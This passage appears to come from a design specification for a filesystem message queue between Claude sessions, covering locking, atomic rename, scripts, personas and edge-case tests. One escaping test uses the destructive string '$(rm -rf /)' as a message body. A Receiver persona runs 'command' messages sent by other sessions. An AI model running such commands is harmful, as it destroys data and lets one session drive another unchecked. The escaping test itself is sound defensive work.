        FOR each name, session IN registry.sessions:
            IF session.pid == $$ AND session.bit == my_bit:
                registry.recycled_bits.push(session.bit)
                DELETE registry.sessions[name]
                found = true
                BREAK

        IF NOT found:
            EXIT 6                                  # Session not found in registry

        write_json("$queue_dir/registry.json", registry)
    # lock released

    rm -f "$queue_dir/.sessions/$$.bit"
    rm -f "$queue_dir/.sessions/$$.start_time"

    EXIT 0
```

**Postconditions:**
- Session removed from `registry.json`
- Bit added to `recycled_bits` for reuse (INV-R3)
- `.sessions/<PID>.bit` and `.sessions/<PID>.start_time` deleted
- Messages already posted by this session remain — their `required` masks are immutable snapshots

**Invariants respected:** INV-R3 (bit recycling), INV-R5 (registry mutation under lock)

**Atomicity:** Registry mutation under `lockf` (§5.6).

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | Success |
| 6 | Session not found in registry |
| 10 | Registry corrupt |
| 11 | Lock acquisition failed |

---

### 4.7 Heartbeat()

Updates the session's `last_heartbeat` timestamp in the registry.

**Preconditions:**
- Caller is registered (`.sessions/$$.bit` exists)

**Algorithm:**

```
FUNCTION Heartbeat():
    queue_dir = TEAM_QUEUE_DIR
    my_bit = read("$queue_dir/.sessions/$$.bit")

    lockf "$queue_dir/registry.lock":
        registry = read_json("$queue_dir/registry.json")
        IF parse_error:
            EXIT 10

        FOR each name, session IN registry.sessions:
            IF session.pid == $$ AND session.bit == my_bit:
                session.last_heartbeat = now_iso8601()
                write_json("$queue_dir/registry.json", registry)
                EXIT 0

        EXIT 6                                      # Session not found
    # lock released
```

**Postconditions:**
- `last_heartbeat` updated for the calling session
- No other registry fields modified

**Invariants respected:** INV-R4 (heartbeat keeps session alive), INV-R5 (under lock)

**Atomicity:** Registry mutation under `lockf` (§5.6).

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | Success |
| 6 | Session not found in registry |
| 10 | Registry corrupt |
| 11 | Lock acquisition failed |

---

### 4.8 Error Handling Summary

| Condition | Behavior |
|-----------|----------|
| `registry.json` does not exist | Create with empty default (`Register` only). All other ops exit 10. |
| `registry.json` fails JSON parse | Exit 10. Manual intervention required. |
| `messages/` directory does not exist | `Register` creates it. Other ops treat as empty (no messages). |
| `.sessions/$$.bit` missing | Exit 10 — caller is not registered. |
| Message dir disappears mid-operation | Handle ENOENT gracefully, skip entry (concurrent GC). |
| `lockf` times out or fails | Exit 11. Caller should retry with backoff. |
| Disk full during write | `.tmp-*` remains orphaned, cleaned by next GC cycle. |

---

## 5. Atomicity Guarantees

<!-- Owner: fs-atomicity-researcher -->

> **Sources :**
> - IEEE Std 1003.1-2017 (POSIX.1-2017) — [rename()](https://pubs.opengroup.org/onlinepubs/9699919799/functions/rename.html), [open()](https://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html), [mkdir()](https://pubs.opengroup.org/onlinepubs/9699919799/functions/mkdir.html), [readdir()](https://pubs.opengroup.org/onlinepubs/9699919799/functions/readdir.html), [unlink()](https://pubs.opengroup.org/onlinepubs/9699919799/functions/unlink.html)
> - Apple. *Apple File System Guide — Features.* ([archive](https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/APFS_Guide/Features/Features.html))
> - Crowley, R. *Things UNIX can do atomically.* 2010. ([link](https://rcrowley.org/2010/01/06/things-unix-can-do-atomically.html))
> - Pennarun, A. *Everything you never wanted to know about file locking.* 2010. ([link](https://apenwarr.ca/log/20101213))
> - `man 2 rename`, `man 2 open`, `man 2 mkdir`, `man 1 lockf`, `man 2 flock` (macOS 14+)

### 5.1 Operation Atomicity Table

The following table lists every filesystem operation used by the protocol, its atomicity guarantee, and the relevant conditions.

| Operation | Syscall | Atomic? | Condition | POSIX Ref | macOS/APFS Notes |
|-----------|---------|---------|-----------|-----------|------------------|
| **Create staging dir** | `mkdir()` | **Yes** | Always on local FS. Returns `EEXIST` if already exists. | POSIX.1 §mkdir | Atomic on APFS, HFS+, ext4. |
| **Write payload.json** | `write()` | **No** | Writes are not atomic for arbitrary sizes. Partial writes possible on crash. | POSIX.1 §write | Same. Mitigated by write-to-tmp-then-rename pattern (see §5.3). |
| **Publish message** (rename staging to final) | `rename()` | **Yes** | Both paths must be on the **same filesystem**. Fails with `EXDEV` otherwise. | POSIX.1 §rename | APFS: atomic via copy-on-write metadata. Also supports Atomic Safe-Save for directories. |
| **Create ack file** | `open(O_CREAT\|O_EXCL)` | **Yes** | Atomic create-or-fail. Returns `EEXIST` if file already exists. | POSIX.1 §open | Guaranteed on APFS, HFS+, ext4. |
| **Create ack file** (via `touch`) | `open(O_CREAT)` + `utimes()` | **Partial** | `O_CREAT` without `O_EXCL` is atomic for creation but does not fail on existing file — it silently succeeds. Acceptable for idempotent acks. | POSIX.1 §open | Safe for our use case (ack is idempotent). |
| **List messages** | `readdir()` | **No** | See §5.4 — no atomicity guarantee for concurrent additions/removals. | POSIX.1 §readdir | Same on all platforms. |
| **Lock registry** | `lockf(F_LOCK)` | **Yes** | Advisory lock. All cooperating processes must use the same locking protocol. | POSIX.1 §lockf | macOS unified locking: `lockf`, `flock`, `fcntl` share the same kernel implementation. |
| **Read registry** | `read()` | **No** | Not atomic for files larger than `PIPE_BUF`. Must hold lock. | POSIX.1 §read | Same. Protected by advisory lock in our protocol. |
| **Delete message** (GC) | `rm -rf` (`unlink()` + `rmdir()`) | **No** | Directory removal is a sequence of `unlink()` calls, not a single atomic op. | POSIX.1 §unlink, §rmdir | Safe: see §5.5 on concurrent deletion. |
| **Check liveness** | `kill(pid, 0)` | **Yes** | Atomic PID existence check. Returns `ESRCH` if process does not exist. | POSIX.1 §kill | Same. Subject to PID recycling (see §5.6). |

### 5.2 Filesystem Comparison

| Property | APFS (macOS) | HFS+ (legacy macOS) | ext4 (Linux) | btrfs (Linux) |
|----------|-------------|---------------------|-------------|--------------|
| `rename()` atomic same-FS | **Yes** (CoW metadata) | **Yes** (journal) | **Yes** (journal) | **Yes** (CoW) |
| `rename()` crash-safe | **Yes** — CoW ensures old or new state, never partial | **Yes** — metadata journal protects | **Yes** — metadata journal (data=ordered default) | **Yes** — CoW |
| `open(O_CREAT\|O_EXCL)` atomic | **Yes** | **Yes** | **Yes** | **Yes** |
| `mkdir()` atomic | **Yes** | **Yes** | **Yes** | **Yes** |
| `readdir()` consistent during mutation | **No** (POSIX-unspecified) | **No** | **No** | **No** |
| Advisory locking (`lockf`/`flock`) | **Yes** — unified kernel impl | **Yes** | **Yes** — `lockf`/`fcntl` unified; `flock` separate | **Yes** |
| Atomic Safe-Save (directory rename) | **Yes** — native APFS feature | **No** — requires workaround | N/A | N/A |

### 5.3 The Write-to-Tmp-then-Rename Pattern

This is the core pattern ensuring message publication atomicity:

```
1. mkdir  messages/.tmp-<uuid>/          # Atomic: creates staging area
2. mkdir  messages/.tmp-<uuid>/ack/      # Prepare ack subdirectory
3. write  messages/.tmp-<uuid>/payload.json   # Non-atomic, but invisible
4. write  messages/.tmp-<uuid>/required       # Non-atomic, but invisible
5. rename messages/.tmp-<uuid>/  ->  messages/<uuid>/   # ATOMIC PUBLISH
```

**Why it works:**

- Steps 1-4 write into a `.tmp-*` directory that the polling protocol ignores (poll only lists entries not starting with `.tmp-`).
- Step 5, `rename()`, is atomic on all target filesystems when source and destination are on the same filesystem. After rename returns, the directory and all its contents are visible under the new name. There is no intermediate state where a half-written message is visible.
- On APFS specifically, the rename uses copy-on-write metadata: the old directory pointer or the new one is active — never a partial state. This holds even across power loss.

**When it can fail:**

- **Cross-filesystem rename** (`EXDEV`): If `messages/` and `.tmp-*` are on different mount points, `rename()` fails. **Mitigation:** Both directories are under `~/.claude/team-queue/`, guaranteed same filesystem.
- **Disk full during rename**: On APFS/ext4, rename of an existing directory entry does not allocate new data blocks (it updates metadata only), so disk-full during rename is extremely unlikely. If the filesystem is so full that metadata allocation fails, `rename()` returns `ENOSPC`.
- **Crash between steps 3 and 5**: The `.tmp-*` directory remains. The GC process should clean up orphaned `.tmp-*` directories older than a threshold (e.g., 60 seconds).

### 5.4 readdir() and Concurrent Modifications

**POSIX specification (§readdir):**

> *"If a file is removed from or added to the directory after the most recent call to `opendir()` or `rewinddir()`, whether a subsequent call to `readdir()` returns an entry for that file is unspecified."*

**Implications for our protocol:**

1. **A poll may miss a message that was just published.** This is acceptable — the next poll cycle will see it. The protocol does not require exactly-once delivery in a single poll.
2. **A poll may see a message that was just deleted by GC.** The poll code must handle `ENOENT` gracefully when opening `payload.json` in a directory returned by `readdir()`.
3. **No "half-renamed" directory.** A `rename()` is atomic at the inode level: `readdir()` will return either the old name or the new name, never a corrupted entry. A `.tmp-<uuid>` entry may appear in one call and be replaced by `<uuid>` in the next, but both are valid directory names.
4. **Duplicate entries.** POSIX does not guarantee that `readdir()` returns each entry exactly once during concurrent modification. In practice, all major local filesystems (APFS, ext4, btrfs) do not return duplicates for stable entries, but the protocol should be idempotent regardless.

**Recommendation:** Poll should filter `readdir()` results (skip `.tmp-*` and `.`/`..`), then attempt to open each remaining entry defensively with error handling for `ENOENT`.

### 5.5 Concurrent Deletion Safety (rm -rf during read)

**POSIX guarantee (§unlink):**

> *"If the name was the last link to a file but any processes still have the file open, the file shall remain in existence until the last file descriptor referring to it is closed."*

**What this means for our GC:**

- If process A is reading `messages/<uuid>/payload.json` (has an open fd) and process B runs `rm -rf messages/<uuid>/`, process A can **safely finish reading**. The directory entries are unlinked, but the file data remains accessible through A's open file descriptor.
- Once A closes the fd, the kernel frees the inode and data blocks.
- Process B's `rm -rf` will succeed immediately (from B's perspective, the directory is gone). Process A continues reading stale-but-valid data.

**This is safe on all target platforms** (macOS/APFS, Linux/ext4, Linux/btrfs). The protocol's GC does not need to coordinate with active readers beyond the ack-mask check.

### 5.6 Advisory Locking: lockf on macOS

The protocol uses `lockf -k` (shell utility wrapping `lockf(3)` / `fcntl(F_SETLK)`) to protect `registry.json`.

**Key properties:**

| Property | Behavior |
|----------|----------|
| Lock type | **Advisory** — only enforced between cooperating processes that also call `lockf`. Non-cooperating processes can read/write freely. |
| Granularity | Byte-range, but we lock the entire file (offset 0, length 0 = whole file). |
| Inheritance | Locks are tied to the process (PID), not the file descriptor. `fork()` does NOT inherit locks. |
| Release | Automatic on process exit / crash — the kernel releases advisory locks when the owning process terminates. |
| macOS specificity | On macOS, `lockf()`, `flock()`, and `fcntl()` locks share a **unified kernel implementation**. Mixing them on the same file works (unlike Linux where `flock` and `fcntl` are independent). |
| NFS caveat | Advisory locks may not work over NFS. **Not a concern**: `~/.claude/` is always on a local filesystem. |

**Recommendation:** Use `lockf -k <lockfile> <command>` for all registry operations. The `-k` flag keeps the lock for the entire duration of `<command>`. If the process crashes, the lock is released automatically by the kernel.

### 5.7 Identified Risks

#### Risk 1: rename() is NOT atomic cross-filesystem

`rename()` fails with `EXDEV` if source and destination are on different mount points. This would break the write-to-tmp-then-rename pattern.

- **Likelihood:** Very low. Both `.tmp-*` and final destination are under `~/.claude/team-queue/`.
- **Mitigation:** The protocol MUST ensure staging and final directories share the same parent. Scripts should verify this at startup.

#### Risk 2: Crash during write (before rename)

If the system crashes between writing `payload.json` and calling `rename()`, an orphaned `.tmp-*` directory remains.

- **Impact:** No message corruption (the message was never published). Wasted disk space.
- **Mitigation:** GC should scan for `.tmp-*` directories older than 60 seconds and remove them.

#### Risk 3: Crash during rename() itself

On **APFS**: The copy-on-write metadata scheme guarantees that rename either completes fully or not at all, even on power loss. The old directory entry or the new one is valid — never a partial state.

On **ext4** (data=ordered, the default): The journal protects metadata. After recovery, the rename is either fully applied or fully rolled back.

- **Impact:** None on target filesystems. The message is either published or not.

#### Risk 4: PID recycling (kill -0 false positive)

`kill(pid, 0)` checks if a process exists, but PIDs are recycled by the OS. A dead session's PID could be reassigned to an unrelated process.

- **Likelihood:** Low on macOS (PID space is large, sequential allocation). Higher on Linux under heavy fork load.
- **Mitigation:** Combine `kill -0` with a timestamp or start-time check. The registry should store the session's start time and validate it matches.

#### Risk 5: readdir() missing newly published messages

As documented in §5.4, `readdir()` may not return entries added concurrently.

- **Impact:** A poll misses a message. It will be seen on the next poll cycle.
- **Mitigation:** Acceptable by design. The polling interval bounds the worst-case delivery latency to 2x the poll interval.

#### Risk 6: lockf on macOS kernel bugs (historical)

macOS 10.6.5 had a kernel bug causing `fcntl()` locks to be silently dropped (documented by Pennarun 2010). This was fixed in subsequent releases. Modern macOS (12+) has no known locking bugs.

- **Mitigation:** Require macOS 12+ (Monterey). This is already implied by targeting APFS as default.

#### Risk 7: Ack file creation race (two sessions acking simultaneously)

Two sessions creating `ack/<b>` for *different* bit values is safe — different filenames, no conflict. Two sessions creating `ack/<b>` for the *same* bit value cannot happen by design (only the session owning bit `b` creates `ack/<b>`). If it did happen (bug), `O_CREAT` is idempotent — the file simply exists, which is the desired end state.

---

## 6. Scripts Interface

<!-- Owner: protocol-architect -->

### 6.1 Common Environment Variables

All scripts read the following environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `TEAM_QUEUE_DIR` | `~/.claude/team-queue` | Root directory for all queue data. Must be on a local filesystem (not NFS). |
| `TEAM_SESSION_BIT` | _(read from `.sessions/$$.bit`)_ | Cached bit-position. Scripts read this from the file if not set. |
| `TEAM_HEARTBEAT_INTERVAL` | `60` | Seconds between heartbeats. |
| `TEAM_STALE_THRESHOLD` | `300` | Seconds without heartbeat before a session is considered dead. |
| `TEAM_TTL_DEFAULT` | `3600` | Default message TTL in seconds. |
| `TEAM_TMP_MAX_AGE` | `60` | Seconds before orphaned `.tmp-*` dirs are cleaned. |

### 6.2 External Dependencies

| Dependency | Required | Usage |
|------------|----------|-------|
| `jq` | **Yes** | JSON parsing and manipulation for registry and payloads |
| `uuidgen` | **Yes** | Message ID generation (UUID v4). Available on macOS by default. |
| `lockf` | **Yes** | Advisory locking for registry. macOS built-in (`/usr/bin/lockf`). |
| `ps` | **Yes** | Process start time retrieval for PID recycling mitigation. |
| `date` | **Yes** | ISO 8601 timestamp generation. |
| `mktemp` | No | Optional for safer temp file creation. |

### 6.3 Summary Table

| Script | Args | Exit Codes | Stdout | Stderr |
|--------|------|------------|--------|--------|
| `register.sh` | `[name]` | 0, 2, 10, 11 | bit number | progress |
| `deregister.sh` | — | 0, 6, 10, 11 | — | progress |
| `send.sh` | `<target> <type> <body>` | 0, 1, 2, 3, 10, 12 | msg-id | progress |
| `poll.sh` | — | 0, 1, 10 | JSON array | progress |
| `ack.sh` | `<msg-id>` | 0, 4, 5, 10 | — | progress |
| `gc.sh` | — | 0, 10, 11 | count deleted | progress |
| `status.sh` | — | 0, 10 | human-readable | — |
| `heartbeat.sh` | — | 0, 6, 10, 11 | — | progress |

### 6.4 Exit Code Reference

| Code | Meaning | Scripts |
|------|---------|---------|
| 0 | Success | All |
| 1 | No recipients / no messages | `send.sh`, `poll.sh` |
| 2 | Invalid arguments / name already taken | `register.sh`, `send.sh` |
| 3 | Cannot send to self | `send.sh` |
| 4 | Message not found | `ack.sh` |
| 5 | Not a recipient of this message | `ack.sh` |
| 6 | Session not found in registry | `deregister.sh`, `heartbeat.sh` |
| 10 | Registry corrupt or bit file missing | All |
| 11 | Lock acquisition failed | `register.sh`, `deregister.sh`, `gc.sh`, `heartbeat.sh` |
| 12 | Staging directory creation failed | `send.sh` |

### 6.5 Script Details

#### `register.sh [name]`

Registers a new session with the given name and outputs the assigned bit-position.

**Arguments:**

| Arg | Type | Required | Default | Description |
|-----|------|----------|---------|-------------|
| `name` | string | No | `"agent-$$"` | Session name. Must match `[a-zA-Z0-9_-]+`. |

**Behavior:**
1. Creates `TEAM_QUEUE_DIR`, `.sessions/`, and `messages/` directories if missing
2. Acquires lock on `registry.lock`
3. Checks for name collision (reaps stale entry if PID is dead)
4. Allocates bit from `recycled_bits` (FIFO) or increments `next_bit`
5. Drains stale ack files for recycled bits
6. Writes registry, creates `.sessions/$$.bit` and `.sessions/$$.start_time`

**Env vars used:** `TEAM_QUEUE_DIR`

**Dependencies:** `jq`, `lockf`, `ps`, `date`, `uuidgen`

---

#### `deregister.sh`

Removes the current session from the registry and frees its bit for reuse.

**Arguments:** None. Operates on the calling process (`$$`).

**Behavior:**
1. Reads bit from `.sessions/$$.bit`
2. Acquires lock, finds session by PID+bit, removes from registry
3. Pushes bit to `recycled_bits`
4. Deletes `.sessions/$$.bit` and `.sessions/$$.start_time`

**Env vars used:** `TEAM_QUEUE_DIR`

**Dependencies:** `jq`, `lockf`

---

#### `send.sh <target> <type> <body>`

Posts a message to one or all sessions.

**Arguments:**

| Arg | Type | Required | Description |
|-----|------|----------|-------------|
| `target` | string | Yes | `"all"` for broadcast, or a session name |
| `type` | enum | Yes | `"text"`, `"command"`, or `"query"` |
| `body` | string | Yes | Message content (UTF-8). May contain spaces if quoted. |

**Optional env overrides:**

| Variable | Default | Description |
|----------|---------|-------------|
| `TEAM_MSG_PRIORITY` | `"normal"` | `"normal"` or `"high"` |
| `TEAM_MSG_TTL` | `$TEAM_TTL_DEFAULT` | TTL in seconds for this message |
| `TEAM_MSG_REPLY_TO` | `null` | UUID of message being replied to |

**Behavior:**
1. Reads own bit, reads registry (no lock — snapshot is sufficient)
2. Computes `required` bitmask based on target
3. Builds `payload.json` with sender metadata including `start_time`
4. Uses write-to-tmp-then-rename pattern (§5.3)
5. Outputs the message UUID on success

**Env vars used:** `TEAM_QUEUE_DIR`, `TEAM_SESSION_BIT`, `TEAM_MSG_PRIORITY`, `TEAM_MSG_TTL`, `TEAM_MSG_REPLY_TO`

**Dependencies:** `jq`, `uuidgen`, `date`

---

#### `poll.sh`

Lists all unacked messages targeting the current session.

**Arguments:** None.

**Behavior:**
1. Reads own bit from `.sessions/$$.bit`
2. Scans `messages/` directory, skipping `.tmp-*` and dotfiles
3. For each message: reads `required`, checks bit inclusion, checks ack absence
4. Returns matching payloads as a JSON array, sorted by timestamp ascending
5. Handles ENOENT gracefully for concurrent GC

**Output format:** JSON array of payload objects (see §3.3).

**Env vars used:** `TEAM_QUEUE_DIR`, `TEAM_SESSION_BIT`

**Dependencies:** `jq`

---

#### `ack.sh <msg-id>`

Acknowledges a message by creating an ack file.

**Arguments:**

| Arg | Type | Required | Description |
|-----|------|----------|-------------|
| `msg-id` | string (UUID v4) | Yes | The message to acknowledge |

**Behavior:**
1. Reads own bit from `.sessions/$$.bit`
2. Verifies message directory exists
3. Verifies caller's bit is in the `required` mask
4. Creates `ack/<bit>` file (idempotent — safe to re-ack)

**Env vars used:** `TEAM_QUEUE_DIR`, `TEAM_SESSION_BIT`

**Dependencies:** None (pure shell)

---

#### `gc.sh`

Garbage-collects completed messages, expired messages, orphaned staging dirs, and dead sessions.

**Arguments:** None.

**Behavior (3 phases):**
1. **Message GC:** For each published message, compute `ack_mask` by OR-reducing `ack/` files. Delete if `ack_mask & required == required` (fully acked) or TTL expired.
2. **Tmp cleanup:** Delete `.tmp-*` directories older than `TEAM_TMP_MAX_AGE` seconds.
3. **Session reaping:** Under lock, check each session's PID liveness (with `start_time` validation) and heartbeat freshness. Reap dead sessions, recycle their bits.

**Output:** Decimal count of deleted messages (stdout).

**Env vars used:** `TEAM_QUEUE_DIR`, `TEAM_STALE_THRESHOLD`, `TEAM_TMP_MAX_AGE`

**Dependencies:** `jq`, `lockf`, `ps`, `date`

---

#### `status.sh`

Prints human-readable status of the queue (sessions, pending messages).

**Arguments:** None.

**Behavior:**
1. Reads registry (no lock — snapshot read)
2. Counts messages per state (pending, fully-acked, expired)
3. Lists active sessions with bit, PID, name, last heartbeat
4. Outputs formatted text

**Env vars used:** `TEAM_QUEUE_DIR`

**Dependencies:** `jq`, `date`

---

#### `heartbeat.sh`

Updates the current session's `last_heartbeat` timestamp.

**Arguments:** None.

**Behavior:**
1. Acquires lock on `registry.lock`
2. Finds current session by PID+bit
3. Updates `last_heartbeat` to current ISO 8601 timestamp
4. Writes registry

**Intended usage:** Called periodically (every `TEAM_HEARTBEAT_INTERVAL` seconds) by a background loop or trap in the session's main process.

**Env vars used:** `TEAM_QUEUE_DIR`, `TEAM_SESSION_BIT`

**Dependencies:** `jq`, `lockf`, `date`

---

## 7. Agent Personas

<!-- Owner: persona-writer -->

Le skill utilise 3 personas spécialisées, chacune dans un fichier sous `agents/` :

| Persona | Fichier | Rôle | Quand l'invoquer |
|---------|---------|------|------------------|
| **Sender** | `agents/sender.md` | Composer et envoyer des messages. Choisit la cible (`all` ou session nommée), le type (`text`, `command`, `query`), formule le body. Vérifie les sessions actives avant envoi. | L'utilisateur veut envoyer un message, broadcaster une instruction, poser une question à une autre session. |
| **Receiver** | `agents/receiver.md` | Recevoir et traiter les messages entrants. Interprète selon le type : `text` → informe l'utilisateur, `command` → exécute l'instruction, `query` → prépare et envoie une réponse. Ack systématiquement. | L'utilisateur demande de vérifier les messages, ou le hook détecte des messages en attente. |
| **Coordinator** | `agents/coordinator.md` | Gérer le registre (register/deregister), lancer le GC, diagnostiquer les problèmes (sessions mortes, messages bloqués). Opérateur du système. | L'utilisateur demande le status, veut s'enregistrer/désenregistrer, signale un problème, ou demande un nettoyage. |

### Principes de design des personas

1. **Séparation des responsabilités** : chaque persona maîtrise un sous-ensemble des scripts. Le Sender n'ack jamais, le Receiver ne gère pas le registre, le Coordinator n'envoie pas de messages applicatifs.
2. **Scripts comme interface** : les personas ne manipulent jamais le filesystem directement — ils passent toujours par les scripts qui respectent le protocole (locking, atomicité, invariants).
3. **Output structuré** : chaque persona a un format de sortie défini pour que le team lead puisse agréger les résultats.
4. **Rules défensives** : chaque persona a des contraintes explicites pour éviter les anti-patterns (ex: ne pas supprimer un ack-file individuellement, ne pas réparer un registre corrompu automatiquement).

---

## 8. SKILL.md Outline

<!-- Owner: persona-writer -->

Le fichier `SKILL.md` est le prompt principal du skill. Structure :

```
1. Frontmatter YAML
   - name, description, triggers (MANDATORY + secondary)

2. Titre + one-liner
   - "Message Queue Inter-Sessions" + description en une phrase

3. Prérequis
   - setup.sh, dépendances (jq, uuidgen, lockf), hook PreToolUse

4. Concept
   - Explication accessible du CRDT, bitmask, filesystem comme medium

5. Les 3 Personas (table)
   - Sender, Receiver, Coordinator avec fichiers et rôles

6. Commandes
   - send, check, status, register, deregister, gc
   - Raccourcis en langage naturel

7. Workflow automatique
   - Hook : register auto, poll périodique, heartbeat

8. Exemples (4 scénarios)
   - Broadcast, check, status/diagnostic, query ciblée

9. Scripts (table récapitulative)
   - Tous les scripts avec args et description

10. Référence technique
    - Lien vers OPENSPEC.md
```

**Triggers MANDATORY** : `say-to-claude-team`, `team queue`, `message queue`, `inter-session`, `envoyer message aux sessions`, `communiquer avec les autres sessions`, `broadcast`

**Triggers secondaires** : send instructions to other sessions, check for team messages, coordinate work across sessions

---

## 9. Edge Cases & Failure Modes

<!-- Owner: edge-case-tester -->

> **Test coverage:** See `tests/test-suite.sh`. Run: `bash tests/test-suite.sh --verbose`. Both bugs (EC-15, EC-23) confirmed fixed in scripts.

### 9.1 Input Validation

#### EC-1 — Session name with spaces or special characters

| Field | Value |
|-------|-------|
| Description | `register.sh` called with name containing spaces (`alice bob`), quotes (`"x"`), dollar signs (`$var`), or backticks (`` `cmd` ``) |
| Expected | Exit 2, error message, no registry mutation |
| Observed | Exit 2, error message printed to stderr. Registry unchanged. |
| Status | **OK** |

**Rationale:** Name validation uses `grep -qE '^[a-zA-Z0-9_-]+'`. Any character outside `[a-zA-Z0-9_-]` causes early rejection before any lock is acquired.

**Accepted characters:** Letters, digits, hyphens, underscores. Example valid: `my-agent_01`.

---

#### EC-2 — Send with empty body

| Field | Value |
|-------|-------|
| Description | `send.sh` called with `body=""` |
| Expected | Message stored with `body: ""` (empty string), exit 0 |
| Observed | Empty body stored correctly as JSON `""`. |
| Status | **OK** |

**Note:** `jq --arg body ""` handles empty strings correctly. No validation rejects empty bodies — this is intentional (agents may send signal-only messages).

---

#### EC-3 — Send with very large body (>10KB)

| Field | Value |
|-------|-------|
| Description | `send.sh` called with body of 11000 characters |
| Expected | Message stored in full, no truncation, exit 0 |
| Observed | 11001 chars stored (jq adds a trailing newline). No truncation. |
| Status | **OK** (but see recommendation below) |

**Risk:** No upper bound on payload size. A single large message or many large messages could exhaust disk. **Recommendation:** Add `TEAM_MAX_PAYLOAD_SIZE` validation in `send.sh` (see §10.5).

---

#### EC-4 — Send with body containing newlines, quotes, JSON, shell metacharacters

| Field | Value |
|-------|-------|
| Description | Body contains `\n`, `"`, `{...}`, `$(rm -rf /)`, backticks |
| Expected | Body stored exactly as provided, no shell expansion, no JSON breakage |
| Observed | All cases stored correctly. `jq --arg body "$BODY"` safely escapes the value. |
| Status | **OK** |

**Why safe:** `send.sh` passes body via `jq --arg body "$BODY"` which escapes all special characters. The shell variable is never interpolated into JSON directly.

---

#### EC-5 — Invalid message type

| Field | Value |
|-------|-------|
| Description | `send.sh` called with type `"invalid-type"` |
| Expected | Exit 2, error on stderr |
| Observed | Exit 2 (`case` statement rejects unknown types). |
| Status | **OK** |

Valid types: `text`, `command`, `query`.

---

#### EC-6 — Ack with invalid UUID format

| Field | Value |
|-------|-------|
| Description | `ack.sh "not-a-uuid"` |
| Expected | Exit 2, error on stderr |
| Observed | Exit 2. UUID v4 regex validation at entry. |
| Status | **OK** |

---

### 9.2 Poll & Ack Edge Cases

#### EC-7 — Poll when no messages exist

| Field | Value |
|-------|-------|
| Description | `poll.sh` called on an empty queue |
| Expected | `[]` on stdout, exit 1 |
| Observed | `[]` on stdout, exit 1 |
| Status | **OK** |

**Note:** Exit 1 with `[]` (not empty output) is the contract. Callers should distinguish exit 0 (messages found) from exit 1 (no messages) rather than parsing the JSON array length.

---

#### EC-8 — Ack a non-existent message

| Field | Value |
|-------|-------|
| Description | `ack.sh <valid-uuid>` where the UUID does not correspond to any message directory |
| Expected | Exit 4 |
| Observed | Exit 4 |
| Status | **OK** |

**Note:** The ack script checks `dir_exists(messages/<uuid>)` before proceeding. GC-deleted messages return exit 4 on any subsequent ack attempt.

---

#### EC-9 — Ack a message you are not a recipient of

| Field | Value |
|-------|-------|
| Description | Session with bit `B` tries to ack a message whose `required` mask does not include bit `B` |
| Expected | Exit 5 |
| Observed | Exit 5. `(required_int >> my_bit) & 1 == 0` triggers the check. |
| Status | **OK** |

**CRDT safety:** This prevents a non-recipient from creating a stale ack file that could trigger premature GC if they later receive the recycled bit.

---

#### EC-10 — Double ack (idempotence)

| Field | Value |
|-------|-------|
| Description | `ack.sh <uuid>` called twice for the same message and session |
| Expected | Both calls succeed (exit 0), exactly one ack file remains |
| Observed | Both exit 0. `touch` is idempotent (`O_CREAT` on existing file succeeds silently). Exactly 1 ack file. |
| Status | **OK** |

**Formal guarantee:** Follows directly from G-Set idempotence: `A ⊔ A = A` (§2.2).

---

#### EC-11 — Polled message not returned after ack

| Field | Value |
|-------|-------|
| Description | Session acks a message, then polls again |
| Expected | The acked message does not appear in subsequent polls |
| Observed | `poll.sh` correctly skips messages where `ack/<my_bit>` file exists. |
| Status | **OK** |

---

### 9.3 Garbage Collection Edge Cases

#### EC-12 — GC on empty queue

| Field | Value |
|-------|-------|
| Description | `gc.sh` run when `messages/` is empty and registry has no sessions |
| Expected | Exit 0, output `0` |
| Observed | Exit 0, output `0` |
| Status | **OK** |

---

#### EC-13 — GC does not delete partially-acked messages

| Field | Value |
|-------|-------|
| Description | A message with 2 required readers where only 1 has acked |
| Expected | GC leaves the message intact |
| Observed | GC correctly checks `(ack_mask & required_int) == required_int` before deleting. Partial ack → message preserved. |
| Status | **OK** |

**Safety invariant:** This is the GC safety property from §2.4. A message is only collected when `A & R = R`.

---

#### EC-14 — GC deletes TTL-expired messages

| Field | Value |
|-------|-------|
| Description | Message with `ttl_seconds=1` and timestamp set to `2000-01-01T00:00:00Z` |
| Expected | GC removes the message even without full ack |
| Observed | GC correctly detects `now - msg_epoch > ttl` and deletes. |
| Status | **OK** |

---

#### EC-15 — GC cleans orphaned .tmp-* staging directories

| Field | Value |
|-------|-------|
| Description | An orphaned `.tmp-<uuid>` directory older than `TEAM_TMP_MAX_AGE` seconds exists in `messages/` |
| Expected | GC removes it (per spec §4.5, Phase 1b) |
| Observed | GC removes it correctly. |
| Status | **FIXED** |

**Original bug:** `gc.sh` looped via `for entry in "${MESSAGES_DIR}"/*/` — the shell glob `*/` does **not** expand dotfiles on macOS bash. The `.tmp-*` case branch was dead code.

**Fix applied:** `gc.sh` now uses a dedicated separate loop for dotfile directories:
```bash
for tmp_entry in "${MESSAGES_DIR}"/.tmp-*/; do
    [ -d "$tmp_entry" ] || continue
    ...
done
```
This correctly handles dotfile directories without relying on `dotglob` or `find`.

---

#### EC-16 — GC with missing registry

| Field | Value |
|-------|-------|
| Description | `gc.sh` run when `registry.json` does not exist |
| Expected | Phase 1 (message cleanup) completes; Phase 2 (session reaping) skipped; exit 0 |
| Observed | Exit 0. The `[ -f "$REGISTRY_FILE" ]` guard in Phase 2 correctly skips session reaping. |
| Status | **OK** |

---

#### EC-17 — GC with corrupt registry

| Field | Value |
|-------|-------|
| Description | `registry.json` contains invalid JSON |
| Expected | Exit 10 |
| Observed | Exit 10. `jq '.'` parse failure triggers exit. |
| Status | **OK** |

---

### 9.4 Register / Deregister Edge Cases

#### EC-18 — Deregister a session not in the registry

| Field | Value |
|-------|-------|
| Description | `deregister.sh` called with `TEAM_SESSION_BIT=99` when no session with bit 99 exists |
| Expected | Exit 6 |
| Observed | Exit 6 |
| Status | **OK** |

---

#### EC-19 — Register same name when existing session is live

| Field | Value |
|-------|-------|
| Description | A session named `X` is active (live PID + matching start_time). Another process tries to register as `X`. |
| Expected | Exit 2 (name taken) |
| Observed | Exit 2. `kill -0 $pid` check + start_time validation prevents hijacking. |
| Status | **OK** |

---

#### EC-20 — Register reaps stale session (dead PID)

| Field | Value |
|-------|-------|
| Description | Registry contains session `X` with PID 99999 (dead). New register for `X` called. |
